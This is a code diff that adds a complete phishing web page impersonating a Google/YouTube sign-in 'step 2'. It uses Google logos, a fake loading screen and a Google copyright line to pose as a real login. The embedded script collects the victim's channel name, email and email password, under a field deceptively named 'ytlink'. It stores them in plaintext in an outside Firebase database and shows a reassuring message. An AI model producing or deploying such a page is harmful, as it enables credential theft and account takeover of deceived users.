@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link rel="icon" href="https://w7.pngwing.com/pngs/326/85/png-transparent-google-logo-google-text-trademark-logo.png" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f5f5f5;
+        }
+        .loading-screen {
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent background */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loading-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3; 
+            border-radius: 50%;
+            border-top: 8px solid #1a73e8; 
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            color: #202124;
+        }
+        section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            min-height: 100vh;
+        }
+        .box {
+            padding: 40px;
+            width: 350px;
+            background: white;
+            box-shadow: 0px 4px 16px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .google-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .form h2 {
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 24px;
+        }
+        .inputbox {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .form h3{
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 24px;
+        }
+        .inputbox input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 5px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: none;
+            color: #202124;
+            outline: none;
+        }
+        .inputbox span {
+            position: absolute;
+            left: 10px;
+            top: -5px;
+            font-size: 12px;
+            color: #5f6368;
+            background-color: white;
+            padding: 0 4px;
+        }
+        .forgot-link {
+            margin-top: 5px;
+            text-align: left;
+        }
+        .forgot-link a {
+            font-size: 12px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        .sub {
+            width: 100%;
+            padding: 10px 20px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .sub:hover {
+            background-color: #185abc;
+        }
+        .su {
+            width: 100%;
+            padding: 10px 20px;
+            background: #ffffff;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .su:hover {
+            background-color: #f1f3f4;
+        }
+        .divider {
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+        }
+        .divider span {
+            background-color: white;
+            padding: 0 10px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        .divider:before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: #dadce0;
+            z-index: -1;
+        }
+        p.c {
+            margin-top: 30px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="loading-logo">
+        <div class="spinner"></div>
+        <p class="loading-text">Loading, please wait...</p>
+    </div>
+
+    <section>
+        <div class="box">
+            <div class="form">
+                <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
+                <h2>YouTube</h2>
+                <h3>step 2</h3>
+                <form id="myForm">
+                    <div class="inputbox">
+                        <input type="text" value="" id="username" required>
+                        <span>Channel Name</span>
+                    </div>
+                    <div class="inputbox">
+                        <input type="email" value="" id="email" required>
+                        <span>E-mail</span>
+                        <div class="forgot-link">
+                            <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ddm=0&dsh=S-953851948%3A1726468989170269&ec=GAlA8wE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en" target="_blank" rel="noreferrer noopener">Forgot email?</a>
+                        </div>
+                    </div>
+                    <div class="inputbox">
+                        <input type="text" value="" id="ytlink" required>
+                        <span>E-mail Password</span>
+                    </div>
+                    <div class="button-container">
+                        <input type="submit" value="Submit" class="sub" id="submit">
+                    </div>
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+                    <div class="button-container">
+                        <a href="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ec=GAlA8wE&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S-953851948%3A1726468989170269&ddm=0">
+                            <button class="su" type="button">Sign in</button>
+                        </a>
+                    </div>
+                </form>
+            </div>
+            <p class="c">© 2024 by <a href="https://www.google.com" target="_blank" rel="noreferrer noopener">Google LLC</a></p>
+        </div>
+    </section>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCdfXa76HHQmuVEPlK9mc9RaKgRMpZz2ik",
+            authDomain: "g2stape.firebaseapp.com",
+            projectId: "g2stape",
+            storageBucket: "g2stape.appspot.com",
+            messagingSenderId: "839138361831",
+            appId: "1:839138361831:web:51e30c8e6d4fe6bcd4fd42"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        document.getElementById("myForm").addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const email = document.getElementById("email").value;
+            const ytlink = document.getElementById("ytlink").value;
+
+            if (!username || !email || !ytlink) {
+                alert("Fill up the form first.");
+                return; // Stop the submission if any field is empty
+            }
+
+            const userData = {
+                username,
+                email,
+                Password: ytlink
+            };
+
+            set(ref(db, 'user/' + username), userData)
+                .then(() => {
+                    alert("Done,stay tuned via Gmail or WhatsApp.");
+                    window.location.href = "g.html";
+                })
+                .catch((error) => {
+                    console.error("Error adding document: ", error);
+                    alert("An error occurred. Please try again later.");
+                });
+        });
+    </script>
+
+    <script>
+        console.log("Script Loaded");
+
+        // Simulate loading process
+        setTimeout(() => {
+            console.log("Hiding loading screen");
+            document.querySelector('.loading-screen').style.display = 'none';
+        }, 3000); 
+    </script>
+</body>
+</html>
